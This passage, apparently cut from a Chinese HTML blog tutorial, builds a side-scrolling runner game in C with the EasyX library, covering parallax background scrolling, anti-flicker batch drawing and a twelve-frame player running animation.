class="line-numbers-rows"><span></span></span></code></pre><p>用到的函数有👇。</p><blockquote><p>sprintf()：作用是将格式化的数据写入字符串</p><p>loadimage()：加载图片</p><p>putimagePNG()：在想要的坐标上面显示图片</p></blockquote><p>代码如下👇，从main函数开始，执行init的时候，一直到init第一个循环，为什么要这个循环呢？因为，有三张背景图片，所以for循环就下小于3，然后里面的sprintf是格式化字符串，所以定义了name数组，然后sprintf里面的<code>bg%03d</code>指的是<code>最小输出为三个字符，d表示整数，0表示，如果不足三位从左边开始用0补齐</code>，由于我们这里的图片名字是<code>bg001</code>和<code>bg002</code>这种命名方法，就非常好用，后面i+1的作用是让0变成1，然后1变成2，匹配资源文件里面的命名。</p><p>loadimage()函数，上面准备好了字符串在name里面，然后使用loadimage函数取出来就好了，因为上面我们定义了IMAGE对象，只需要让name里面的东西放进IMAGE对象即可。</p><p>最后执行updateBg函数，就是将我们上面加载好的图片放进窗口进行展示，这里putimagePNG2是<code>tools.h</code>的内容，所以需要提前导入，putimagePNG2的使用方法是第一个参数为x轴的数据，第二个参数是y轴的数据，第三个参数为要加载的图片，经过测试，Y轴每个图片，的高度分别是<code>0,119,330</code>。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_CRT_SECURE_NO_WARNINGS</span> <span class="token expression"><span class="token number">1</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;graphics.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"tools.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">WIN_WIDTH</span> <span class="token expression"><span class="token number">1012</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">WIN_HEIGHT</span> <span class="token expression"><span class="token number">396</span></span></span><span class="token comment">//定义IMAGE对象，因为背景有三张图片就使用了数组</span>IMAGE imgBgs<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//创建窗口</span><span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">initgraph</span><span class="token punctuation">(</span>WIN_WIDTH<span class="token punctuation">,</span> WIN_HEIGHT<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">sprintf</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token string">"res/bg%03d.png"</span><span class="token punctuation">,</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">loadimage</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>imgBgs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">updateBg</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">putimagePNG2</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>imgBgs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">putimagePNG2</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>imgBgs<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">putimagePNG2</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">330</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>imgBgs<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">updateBg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实现效果如下图👇</p><p><img src="/images/wordimage/2022/0306/bg.png"></p><h3 id="3-实现背景资源的移动-amp-amp-无限加载"><a href="#3-实现背景资源的移动-amp-amp-无限加载" class="headerlink" title="3.实现背景资源的移动&amp;&amp;无限加载"></a>3.实现背景资源的移动&amp;&amp;无限加载</h3><p>我们需要让我们的背景从右往左移动，也就是减少，需要改变的也就是我们的X轴，我们上面把X轴写死全部为0了，我们不能写死X轴。</p><p>使用的函数如下👇。</p><blockquote><p>BeginBatchDraw()：执行批量绘图</p><p>EndBatchDraw()：批量绘图结束</p><p>fly()：自定义函数来实现x轴的，从右往左</p></blockquote><p>首先，自定义了Bgspeed数组，这个数组的作用是，来定义不同背景图片的，速度。</p><p>定义了fly函数使用循环来判断，三个背景图片，<code>bgX[i] -= Bgspeed[i];</code>这句话的意思是当前的X轴位置减去，对应的速度，一直循环调用，这样就已经实现了，但是有几个BUG，分别是，图片走完了就没了，然后回闪烁，解决办法就是，在fly函数里面增加一个判断，判断背景图片当前的X轴，是否小于了窗口的宽度，如果小于了窗口的宽度，那么就重新变为0.</p><p>在<code>main</code>函数里面一个while循环，来一直调用updateBg这个函数，也就是，一直刷新窗口，比如，窗口的移动就是这个刷新的，然后BeginBatchDraw()函数，这个的作用是，防止闪烁，出现闪烁的原因是，加载不是同时的，因为执行updateBg函数的时候里面回一直在屏幕上显示图片，只不过是从上往下显示，如果使用了这个BeginBatchDraw函数，那么就是先全部执行完毕之后在再屏幕上面渲染，EndBatchDraw这个函数是BeginBatchDraw结束函数，官方用法👉<a href="https://docs.easyx.cn/zh-cn/BeginBatchDraw%E3%80%82">https://docs.easyx.cn/zh-cn/BeginBatchDraw。</a></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_CRT_SECURE_NO_WARNINGS</span> <span class="token expression"><span class="token number">1</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;graphics.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"tools.h"</span></span><span class="token comment">//定义常量</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">WIN_WIDTH</span> <span class="token expression"><span class="token number">1012</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">WIN_HEIGHT</span> <span class="token expression"><span class="token number">396</span></span></span><span class="token comment">/*基于easyx搭建*/</span><span class="token comment">//背景图片</span>IMAGE imgBgs<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//背景图片x坐标</span><span class="token keyword">int</span> bgX<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//定义不同背景的速度</span><span class="token keyword">int</span> Bgspeed<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//游戏的初始化;</span><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//创建游戏窗口</span><span class="token function">initgraph</span><span class="token punctuation">(</span>WIN_WIDTH<span class="token punctuation">,</span> WIN_HEIGHT<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//加载背景资源</span><span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//res/bg001 ,res/bg002</span><span class="token comment">//sprintf将格式化的数据写入字符串</span><span class="token function">sprintf</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">"res/bg%03d.png"</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//loadimage加载图片</span><span class="token function">loadimage</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>imgBgs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//初始化背景x坐标</span>bgX<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//定义不同背景移动速度</span><span class="token keyword">void</span> <span class="token function">fly</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>bgX<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-=</span> Bgspeed<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//判断背景图片不够长，重新拼接图片</span><span class="token keyword">if</span> <span class="token punctuation">(</span>bgX<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token operator">-</span>WIN_WIDTH<span class="token punctuation">)</span><span class="token comment">//如果x轴，小于了窗口的宽度，那么X轴重新变为0</span><span class="token punctuation">&#123;</span>bgX<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//渲染游戏背景</span><span class="token keyword">void</span> <span class="token function">updateBg</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//渲染背景,输出到坐标，不能使用PNG版本，会出BUG</span><span class="token function">putimagePNG2</span><span class="token punctuation">(</span>bgX<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>imgBgs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">putimagePNG2</span><span class="token punctuation">(</span>bgX<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>imgBgs<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">putimagePNG2</span><span class="token punctuation">(</span>bgX<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">330</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>imgBgs<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//循环展示背景</span><span class="token keyword">while</span> <span class="token punctuation">(</span>true<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//解决背景，闪烁的问题BeginBatchDraw和EndBatchDraw</span><span class="token function">BeginBatchDraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">updateBg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">EndBatchDraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fly</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//帧等待30毫秒</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//暂停程序的运行，不然执行一次之后会直接退出</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行效果如下👇。</p><p><img src="/images/wordimage/2022/0306/Bgyundong.png"></p><hr><h2 id="二-实现玩家奔跑"><a href="#二-实现玩家奔跑" class="headerlink" title="二.实现玩家奔跑"></a>二.实现玩家奔跑</h2><p>思路和上面一样，需要加载图片，然后把图片显示在上面就可以了。</p><p>这里是把图片放在窗口中间，然后玩家操作的有十二个图片，需要在中间循环展示十二个图片。</p><p>首先要理解如下图👇,Y轴就是345减去人物的高度</p><p><img src="/images/wordimage/2022/0306/jisuan.png"></p><p>理解之后就好写代码了，和上面一样首先定义一个数组来装玩家的图片。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">19</span><span class="token comment">//定义主角图片对象</span><span class="token number">20</span>IMAGE imgHeros<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后定义一个循环，这里循环还是在Init函数里面循环即可，装载方法和上面背景一样。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">45</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">12</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token number">46</span><span class="token punctuation">&#123;</span><span class="token number">47</span><span class="token comment">//加载主角图像资源</span><span class="token number">48</span><span class="token function">sprintf</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token string">"res/hero%d.png"</span><span class="token punctuation">,</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">49</span><span class="token function">loadimage</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>imgHeros<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">50</span><span class="token number">51</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里只需要装载玩家的图片，就直接在main函数里面装载了。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">80</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">81</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">82</span><span class="token comment">//循环展示背景</span><span class="token number">83</span><span class="token keyword">while</span> <span class="token punctuation">(</span>true<span class="token punctuation">)</span><span class="token number">84</span><span class="token punctuation">&#123;</span><span class="token number">85</span><span class="token comment">//解决背景，闪烁的问题BeginBatchDraw和EndBatchDraw</span><span class="token number">86</span><span class="token function">BeginBatchDraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">87</span><span class="token function">updateBg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">88</span><span class="token comment">//推送玩家图像到屏幕</span><span class="token number">89</span><span class="token function">putimagePNG2</span><span class="token punctuation">(</span>heroX<span class="token punctuation">,</span>heroY<span class="token punctuation">,</span><span class="token operator">&amp;</span>imgHeros<span class="token punctuation">[</span>heroIndex<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">90</span><span class="token function">EndBatchDraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">91</span><span class="token function">fly</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">92</span><span class="token comment">//帧等待30毫秒</span><span class="token number">93</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">94</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的heroX和heroY分辨是定义的玩家的X轴和Y轴。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">21</span><span class="token comment">//定义玩家初始x轴和y轴</span><span class="token number">22</span><span class="token keyword">int</span> heroX<span class="token punctuation">;</span><span class="token number">23</span><span class="token keyword">int</span> heroY<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后在init函数里面编写玩家X轴和Y轴的初始位置，其中.getwidth()是获取图像的宽度，.getheight是获取图像的高度</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">53</span><span class="token comment">//设置玩家初始位置</span><span class="token number">54</span>heroX <span class="token operator">=</span> WIN_WIDTH <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">-</span> imgHeros<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getwidth</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment">//定义玩家初始X轴</span><span class="token number">55</span>heroY <span class="token operator">=</span> <span class="token number">345</span> <span class="token operator">-</span> imgHeros<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getheight</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后89行的heroIndex是为了，防止推送图像一直推送一张图，然后在fly函数里面做了自增。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">24</span><span class="token comment">//定义玩家初始帧</span><span class="token number">25</span><span class="token keyword">int</span> heroIndex<span class="token punctuation">;</span><span class="token number">60</span><span class="token keyword">void</span> <span class="token function">fly</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">61</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token number">62</span><span class="token punctuation">&#123;</span><span class="token number">63</span>bgX<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-=</span> Bgspeed<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token number">64</span><span class="token comment">//判断背景图片不够长，重新拼接图片</span><span class="token number">65</span><span class="token keyword">if</span> <span class="token punctuation">(</span>bgX<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token operator">-</span>WIN_WIDTH<span class="token punctuation">)</span><span class="token comment">//如果x轴，小于了窗口的宽度，那么X轴重新变为0</span><span class="token number">66</span><span class="token punctuation">&#123;</span><span class="token number">67</span>bgX<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token number">68</span><span class="token punctuation">&#125;</span><span class="token number">69</span><span class="token punctuation">&#125;</span><span class="token number">70</span><span class="token comment">//每次推图片的时候，序列都加一除以12取余，因为主角只有12个图片，11除以12取余还是11.</span><span class="token number">71</span>heroIndex <span class="token operator">=</span> <span class="token punctuation">(</span>heroIndex <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">12</span><span class="token punctuation">;</span><span class="token number">72</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>全部代码如下👇</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_CRT_SECURE_NO_WARNINGS</span> <span class="token expression"><span class="token number">1</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;graphics.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"tools.h"</span></span><span class="token comment">//定义常量</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">WIN_WIDTH</span> <span class="token expression"><span class="token number">1012</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">WIN_HEIGHT</span> <span class="token expression"><span class="token number">396</span></span></span><span class="token comment">/*基于easyx搭建*/</span><span class="token comment">//背景图片</span>IMAGE imgBgs<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//背景图片x坐标</span><span class="token keyword">int</span> bgX<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//定义不同背景的速度</span><span class="token keyword">int</span> Bgspeed<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//定义主角图片对象</span>IMAGE imgHeros<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//定义玩家初始x轴和y轴</span><span class="token keyword">int</span> heroX<span class="token punctuation">;</span><span class="token keyword">int</span> heroY<span class="token punctuation">;</span><span class="token comment">//定义玩家初始帧</span><span class="token keyword">int</span> heroIndex<span class="token punctuation">;</span><span class="token comment">//游戏的初始化;</span><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//创建游戏窗口</span><span class="token function">initgraph</span><span class="token punctuation">(</span>WIN_WIDTH<span class="token punctuation">,</span> WIN_HEIGHT<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//加载背景资源</span><span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//res/bg001 ,res/bg002</span><span class="token comment">//sprintf将格式化的数据写入字符串</span><span class="token function">sprintf</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">"res/bg%03d.png"</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//loadimage加载图片</span><span class="token function">loadimage</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>imgBgs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//初始化背景x坐标</span>bgX<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//遍历加载主角资源,12张图片</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">12</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//加载主角图像资源</span><span class="token function">sprintf</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token string">"res/hero%d.png"</span><span class="token punctuation">,</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">loadimage</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>imgHeros<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//设置玩家初始位置</span>heroX <span class="token operator">=</span> WIN_WIDTH <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">-</span> imgHeros<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getwidth</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment">//定义玩家初始X轴</span>heroY <span class="token operator">=</span> <span class="token number">345</span> <span class="token operator">-</span> imgHeros<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getheight</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>heroIndex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//定义不同背景移动速度</span><span class="token keyword">void</span> <span class="token function">fly</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>bgX<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-=</span> Bgspeed<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//判断背景图片不够长，重新拼接图片</span><span class="token keyword">if</span> <span class="token punctuation">(</span>bgX<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token operator">-</span>WIN_WIDTH<span class="token punctuation">)</span><span class="token 